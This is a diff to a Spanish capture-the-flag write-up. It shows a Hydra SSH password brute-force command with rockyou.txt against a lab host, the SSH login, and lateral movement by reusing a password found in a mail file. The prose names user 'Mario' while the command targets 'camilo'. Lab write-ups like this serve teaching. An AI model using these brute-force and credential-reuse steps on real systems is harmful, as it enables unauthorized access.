@@ -51,7 +51,7 @@ En el sitio web no vemos nada pero mirando el código fuente de la página descu
 ![](../../../Images/Pasted%20image%2020241008170742.png)
 # Usuario Camilo
 
-Logramos conseguir una conrtaseña para el usuario **Mario** realizando un ataqiue de fuerza bruta de contraseñas con **Hydra** y logramos acceder en el sistems objectivo.
+Logramos conseguir una contraseña para el usuario **Mario** realizando un ataque de fuerza bruta de contraseñas con **Hydra** y logramos acceder en el sistems objectivo.
 
 ```
 > hydra -l camilo -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh
@@ -71,7 +71,6 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-08 17:07:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-08 17:08:02
 ```
 
-
 ```
 ssh camilo@172.17.0.2
 The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
@@ -82,12 +81,9 @@ Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
 camilo@172.17.0.2's password:
 $
 ```
-
-
-
 # Usuario Juan
 
-
+Una vez dentro del sistema realitzamos una enumeración y logramos enoctrar un correo electrónico con una contraseña. Protgrando la cotnaseña copn los diferentes usuario que existen logramos un movimeinto lateral hacia el usuario **Juan**.
 
 ```
 camilo@a8996f6fcde9:/var/mail/camilo$ cat correo.txt
